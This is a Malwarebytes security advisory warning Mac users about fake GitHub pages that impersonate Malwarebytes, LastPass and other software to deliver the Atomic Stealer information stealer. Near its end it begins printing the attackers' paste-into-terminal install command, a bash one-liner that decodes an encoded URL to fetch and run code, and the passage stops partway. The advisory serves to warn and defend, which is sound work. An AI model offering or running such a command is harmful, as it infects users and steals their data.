# Fake Malwarebytes, LastPass, and others on GitHub serve malware

Posted: September 23, 2025
 by [Pieter Arntz](https://www.malwarebytes.com/blog/authors/metallicamvp)

Fake versions of legitimate software are currently circulating on GitHub pages, in a large-scale campaign targeting Mac users.

Unfortunately, Malwarebytes for Mac is one of them.

Impersonating brands is sadly commonplace, as scammers take advantage of [established brand names](https://www.malwarebytes.com/blog/news/2024/05/beware-of-scammers-impersonating-malwarebytes) to target their victims. So this is nothing new, but we always want to warn you about it when we see it happening.

In this case, the cybercriminals’ goal is to distribute information stealers. They figured out a while ago that the easiest way to infect Macs is to get users to [install the malware themselves](https://www.threatdown.com/blog/atomic-stealer-now-using-clipboard-hijacking-to-target-macs), and the [Atomic Stealer](https://www.malwarebytes.com/blog/detections/osx-atomicstealer) (aka AMOS) is the go-to information stealer for Macs.

The LastPass Threat Intelligence team has [posted](https://blog.lastpass.com/posts/attack-targeting-macs-via-github-pages) information about the campaign, which follows a similar pattern for all the impersonated software. Sometimes, the starting point is a sponsored Google ad ([did we mention we don’t like them? Oh yes, we did!](https://www.malwarebytes.com/blog/product/2025/05/tired-of-google-sponsored-ads-so-are-we-thats-why-were-introducing-the-option-to-block-them-on-ios)) that points to GitHub instead of the official page of the developer.

But in other, less obvious cases, you may see search results like these:

![Search results for Malwarebytes Github MacOS](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/09/Malwarebytes_GitHub.png)

These only came up at the top of the search results when I explicitly searched for “Malwarebytes Github MacOS”, but the cybercriminals are known to have used [Search Engine Optimization (SEO) techniques](https://www.malwarebytes.com/blog/news/2018/05/seo-poisoning-is-it-worth-it) to get their listings higher in the search results.

The idea is to get the aspiring user to click on the “GET MALWAREBYTES” button on the dedicated GitHub page.

![Fake Malwarebytes GitHub page](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/09/Malwarebytes_Guithub_page.png)

If someone does click that button, they will end up on a download page with instructions on how to install the fake product, which is actually an information stealer.

The terminal installation instructions for Malwarebytes for Mac pointed to a recently registered domain, but thankfully our [Browser Guard](https://www.malwarebytes.com/browserguard) blocked it anyway.

Here’s a technical breakdown of the instructions provided to the visitor:

* `/bin/bash -c "<something>"` runs a command using the Bash shell on macOS or Linux. Bash is the interpreter for shell commands.
* The part in quotes uses `$( ... )`. Everything inside this gets executed first; its output becomes part of the outer command.
* `$(echo aHR0cHM...
